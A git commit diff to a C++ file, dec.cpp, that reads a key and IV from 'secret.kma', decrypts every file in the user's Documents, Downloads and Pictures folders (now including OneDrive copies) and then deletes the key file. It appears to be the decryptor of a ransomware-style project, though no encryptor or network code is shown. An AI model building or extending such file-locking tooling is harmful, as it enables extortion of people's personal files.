f8bcdf06dafe1f2736d10e235238c2724f8e6bed
ng0cph0ng <fogsbuddha@gmail.com>
2024-05-13 20:58:45 +0700

    Update dec.cpp

--- src/dec.cpp
+++ src/dec.cpp
@@ -2,27 +2,40 @@
 
 int main()
 {
-    uint8_t key[16];
-    uint8_t iv[16];
+    if (filesExist("secret.kma"))
+    {
+        uint8_t key[16];
+        uint8_t iv[16];
 
-    readKeyAndIVFromDesktop("secret.kma", key, iv, size);
+        readKeyAndIVFromDesktop("secret.kma", key, iv, size);
 
-    std::string username = getCurrentUsername();
-    std::string path = "C:\\Users\\" + username + "\\";
-    
-    // Các thư mục cần xem
-    std::vector<std::string> folders = { "Documents", "Downloads", "Pictures" };
-    
-    for (const auto& folder : folders) {
-        std::string folderPath = path + folder + "\\";
+        std::string username = getCurrentUsername();
+        std::string path = "C:\\Users\\" + username + "\\";
+        std::string OneDrivePath = path + "OneDrive" + "\\";
+        std::string folderPath;
 
-        // Liệt kê các tệp và thư mục trong thư mục hiện tại
-        std::vector<FileItem> items = listFilesAndDirectories(folderPath);
-        
-        dec(items, "", folderPath, key, iv);
+        // Các thư mục cần xem
+        std::vector<std::string> folders = {"Documents", "Downloads", "Pictures"};
+
+        for (const auto &folder : folders)
+        {
+            if (fs::exists(OneDrivePath) && fs::is_directory(OneDrivePath) && fs::exists(folder) && fs::is_directory(folder))
+            {
+                folderPath = OneDrivePath + folder + "\\";
+            }
+            else
+            {
+                folderPath = path + folder + "\\";
+            }
+
+            // Liệt kê các tệp và thư mục trong thư mục hiện tại
+            std::vector<FileItem> items = listFilesAndDirectories(folderPath);
+
+            dec(items, "", folderPath, key, iv);
+        }
+
+        deleteKeyAndIV("secret.kma");
     }
-
-    deleteKeyAndIV("secret.kma");
 
     return 0;
 }
